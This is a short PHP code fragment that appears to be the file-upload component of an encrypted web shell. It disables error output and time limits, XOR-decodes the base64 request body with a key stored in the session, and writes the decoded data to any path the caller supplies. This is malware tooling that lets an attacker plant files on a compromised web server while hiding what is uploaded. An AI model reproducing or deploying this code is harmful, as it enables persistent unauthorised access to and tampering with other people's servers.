error_reporting(1);
header('Content-Type: text/html; charset=UTF-8');
set_time_limit(0);
ini_set('max_execution_time', '0');

function decode($sdata,$key)
{
	$data=base64_decode($sdata);
	for($i=0;$i<strlen($data);$i++) {	
    	$data[$i] = $data[$i]^$key[$i+1&15];
    }
	return $data;
}

function main($path)
{
	$f = fopen("php://input", 'r');
	$file = fopen($path, "w") or die("Unable to open file!");
	$i=0;
	$line=null;
    while (($line = fgets($f))!=null) {
		$i++;
		if($i>1){
			$d=decode($line,$_SESSION['k']);
			fwrite($file, $d);
		}
    }
	fclose($f);
	fclose($file);
	echo "Success";		
}

